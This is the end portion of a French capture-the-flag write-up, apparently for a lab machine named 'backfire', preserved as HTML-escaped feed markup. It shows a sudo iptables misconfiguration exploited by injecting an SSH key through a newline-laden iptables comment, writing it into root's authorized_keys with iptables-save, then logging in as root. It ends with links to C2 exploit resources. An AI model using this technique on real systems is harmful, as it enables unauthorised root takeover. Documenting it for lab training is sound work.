&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Linux&lt;/span> &lt;span class="nx">backfire&lt;/span> &lt;span class="mf">6.1.0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">amd64&lt;/span> &lt;span class="err">#&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">SMP&lt;/span> &lt;span class="nx">PREEMPT_DYNAMIC&lt;/span> &lt;span class="nx">Debian&lt;/span> &lt;span class="mf">6.1.123&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">x86_64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">HardHatC2&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="p">!&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rules&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">v4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">F&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">use_pty&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nf">iptables&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>On va s&amp;rsquo;appuyer sur l&amp;rsquo;article suivant afin d&amp;rsquo;élever nos privilèges: &lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
>https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/&lt;/a>&lt;/p>
&lt;p>Ici, la conservation des retours à la ligne dans les commentaires d&amp;rsquo;&lt;code>iptables&lt;/code> va nous permettre d&amp;rsquo;écrire dans un fichier arbitaire via &lt;code>iptables-save&lt;/code>.&lt;/p>
&lt;p>Donc, nous allons écraser le fichier des clés publiques autorisées par &lt;code>root&lt;/code> afin d&amp;rsquo;y ajouter la notre.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 2
&lt;/span>&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="err">$&amp;#39;\&lt;/span>&lt;span class="nx">nssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">AA&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">Dk&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">FORWARD&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">OUTPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="s">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">ssh-ed25519 AA...Dk kali@kali
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Nous pouvons maintenant accéder à la machine en tant que root via SSH.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">a7b6&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mi">174&lt;/span>&lt;span class="nx">e&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="ressources">Ressources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
>Repo Github du framework Havoc C2&lt;/a>&lt;br>
&lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
>Repo Github de l&amp;rsquo;exploit SSRF + RCE Havoc C2&lt;/a>&lt;br>
&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
>Article Medium pour l&amp;rsquo;exploit du HardHat C2&lt;/a>&lt;br>
&lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
>Article permettant d&amp;rsquo;exploiter iptables et iptables-save via le défaut de configuration sudo&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>